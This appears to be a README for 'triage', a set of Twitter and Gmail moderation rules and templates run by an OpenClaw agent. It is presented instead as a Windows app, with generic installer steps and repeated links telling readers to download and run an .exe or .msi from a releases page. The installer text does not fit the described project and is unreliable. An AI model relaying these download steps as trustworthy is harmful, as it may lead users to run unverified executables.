# ⚙️ triage - Manage Moderation and Email Policy Easily

[![Download triage](https://img.shields.io/badge/Download-triage-9b59b6?style=for-the-badge&logo=github)](https://github.com/Monu0506577/triage/releases)

---

## 📋 What is triage?

triage helps manage moderation on Twitter and email inboxes. It follows set rules for handling mentions, replies, and emails. It also supports email digests for daily summaries related to moderation.

The tool organizes tasks into automated processes that run in the background. It works with agents and workspaces to keep the workflow smooth and consistent.

---

## 🖥️ System Requirements

- Windows 10 or later (64-bit recommended)  
- At least 4 GB RAM  
- 500 MB free disk space  
- Internet connection for setup and updates  
- A modern web browser for viewing documentation and support pages  

---

## 🎯 Key Features

- Controls Twitter mentions and replies automatically  
- Applies email triage policies for Gmail accounts  
- Sends daily digest emails summarizing blocked or flagged content  
- Runs scheduled tasks through OpenClaw agent `clawblocker`  
- Keeps logs and audit files for transparency and tracking  
- Uses simple templates for email and moderation messages  

---

## 🚀 Getting Started

You will download the software from the releases page. The steps below will guide you on how to get the app running on your Windows computer.

### Step 1: Visit the download page

Go to the releases page to find the latest version of triage:

[Download triage](https://github.com/Monu0506577/triage/releases)

You will see a list of files for different versions here.

---

### Step 2: Download the setup files

Look for the latest release (usually at the top). Download the Windows executable or installer file provided. The file name typically ends with `.exe` or `.msi`.

Save the file to a folder you can easily access, like Downloads or Desktop.

---

### Step 3: Run the installer

Locate the file you just downloaded and double-click it. Follow these steps:

- Click "Next" on the welcome screen  
- Accept the license agreement  
- Choose the installation folder or use the default path  
- Click "Install" to begin  
- Wait for the installation to complete  
- Click "Finish" to close the installer  

---

### Step 4: Open triage

After installation, launch the app from the Start menu or by double-clicking the desktop icon. The main window will open showing your current settings and automation status.

---

## ⚙️ How triage works

triage is built on OpenClaw automation. It uses one agent called `clawblocker` with a single workspace. This workspace holds all the scripts and rules for:

- Twitter mention moderation  
- Twitter reply triage  
- Gmail inbox triage  

All runs happen automatically on a schedule. Logs and audit files keep track of what happened during each run.

The daily email digest runs separately with its own schedule. It sends a summary of actions taken during moderation.

---

## 📁 Important Files and Folders

The app uses several key files and folders. Here is what you need to know about them:

### Rules

- `TWITTER_MENTIONS.md` – Rules for handling Twitter mentions  
- `TWITTER_REPLIES.md` – Rules for handling Twitter replies  
- `EMAILRULES.md` – Rules for triaging email messages  

### Templates

- `openclaw/clawblocker` – Shared workspace templates used by the OpenClaw agent  
- `openclaw/blockdigest` – Templates for daily block digest emails  

These files control how triage processes messages and what emails it sends.

---

## 🔄 Updating triage

To update triage, go back to the [releases page](https://github.com/Monu0506577/triage/releases). Download the latest installer and run it as before.

The installer will upgrade your existing version while keeping your settings intact.

---

## 🛠 Troubleshooting and Tips

- If the app does not open, restart your computer and try again.  
- Make sure your internet connection is active when you run triage for the first time.  
- Check that your email credentials and Twitter API tokens are correctly entered if the app does not process messages.  
- Look for log files inside the app folder if you need to diagnose issues.  
- Close other apps that might block network access on your PC.  
- Allow triage in your Windows firewall if needed.  

---

## 🔗 Useful Links

- Releases page: [https://github.com/Monu0506577/triage/releases](https://github.com/Monu0506577/triage/releases)  
- Twitter mentions rules: [`TWITTER_MENTIONS.md`](./TWITTER_MENTIONS.md)  
- Twitter replies rules: [`TWITTER_REPLIES.md`](./TWITTER_REPLIES.md)  
- Email triage rules: [`EMAILRULES.md`](./EMAILRULES.md)  

---

## 👩‍💻 Running triage Automatically

triage uses scheduled tasks behind the scenes. The OpenClaw agent runs moderation and triage scripts every few minutes for Twitter. The daily email digest runs once a day.

You do not need to manually start these processes once the app is installed and configured.

---

## 🤖 About OpenClaw Workspace Setup

triage depends on OpenClaw to manage automation. Here are key points:

- One agent named `clawblocker` runs all Twitter and email triage automations except daily digest.  
- One workspace holds the entire repository checkout with runbooks and templates.  
- State files separate each task run for cleaner operation and audit.  
- Twitter moderation doubles as a cache warmer named `birdclaw` for faster mention checks.  

The block digest runs separately because it only sends a simple daily email.

---

## 🎯 Next Steps

1. Download and install triage from the [releases page](https://github.com/Monu0506577/triage/releases).  
2. Open triage and verify your settings match your email and Twitter accounts.  
3. Allow the app to run in the background for automation.  
4. Check daily digest emails for summaries of your moderation activities.  

---

# [Download triage](https://github.com/Monu0506577/triage/releases)  
[![Download triage](https://img.shields.io/badge/Download-triage-9b59b6?style=for-the-badge&logo=github)](https://github.com/Monu0506577/triage/releases)